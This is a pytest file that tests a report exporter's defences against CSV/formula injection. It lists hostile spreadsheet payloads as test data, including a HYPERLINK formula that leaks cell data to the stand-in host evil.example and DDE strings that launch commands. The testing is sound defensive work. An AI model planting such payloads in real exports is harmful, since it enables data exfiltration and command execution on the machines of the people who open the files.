"""CSV/formula injection (04-security.md sections 9 and 11).

Report and audit-export cells carry attacker-influenced text (banners,
headers, user agents). None of it may reach a spreadsheet as a formula.
The end-to-end variants (real tool output, real audit rows) live in
tests/integration/test_reports.py.
"""

import csv
import io

import pytest

from app.engine.schemas import Severity
from app.reports.csv_safe import FORMULA_TRIGGERS, MAX_CELL_CHARS, safe_cell, write_csv
from app.reports.exporters import get_exporter
from tests.reports.factories import document, finding

INJECTIONS = [
    "=1+1",
    '=HYPERLINK("http://evil.example/?"&A1,"click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
    "\n=1+1",
    "  =1+1",
    chr(0xFF1D) + "1+1",  # full-width equals sign
]


@pytest.mark.parametrize("payload", INJECTIONS)
def test_safe_cell_neutralises_formula_triggers(payload: str) -> None:
    assert safe_cell(payload).startswith("'")


@pytest.mark.parametrize("value", ["nginx 1.25", "Missing CSP", "", "a=b", "1-2", "x@y"])
def test_safe_cell_leaves_ordinary_text_alone(value: str) -> None:
    assert safe_cell(value) == value


def test_safe_cell_caps_huge_values() -> None:
    assert len(safe_cell("x" * 100_000)) == MAX_CELL_CHARS


def _rows(data: bytes) -> list[list[str]]:
    text = data.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(text)))


def _is_formula(cell: str) -> bool:
    stripped = cell.lstrip(" \t\r\n")
    return bool(stripped) and stripped[0] in FORMULA_TRIGGERS


@pytest.mark.parametrize("payload", INJECTIONS)
def test_csv_export_blocks_injection_in_every_text_field(payload: str) -> None:
    doc = document(
        [
            finding(
                payload,
                Severity.HIGH,
                explanation=payload,
                remediation=payload,
                severity_rationale=payload,
                evidence={"banner": payload},
                references=[payload],
            )
        ],
        target=payload,
    )
    rows = _rows(get_exporter("csv").render(doc))
    assert len(rows) == 2  # header + one finding: no injected rows
    for cell in rows[1]:
        assert not _is_formula(cell), cell


def test_csv_export_is_bom_utf8_fully_quoted_crlf() -> None:
    data = get_exporter("csv").render(document([finding('Comma, "quote"\nnewline')]))
    assert data.startswith(b"\xef\xbb\xbf")
    assert b'"F-01"' in data and b"\r\n" in data
    rows = _rows(data)
    assert rows[0][0] == "finding" and rows[1][5] == 'Comma, "quote"\nnewline'


def test_write_csv_header_is_sanitised_too() -> None:
    rows = _rows(write_csv(["=bad"], [["ok"]]))
    assert rows[0] == ["'=bad"]
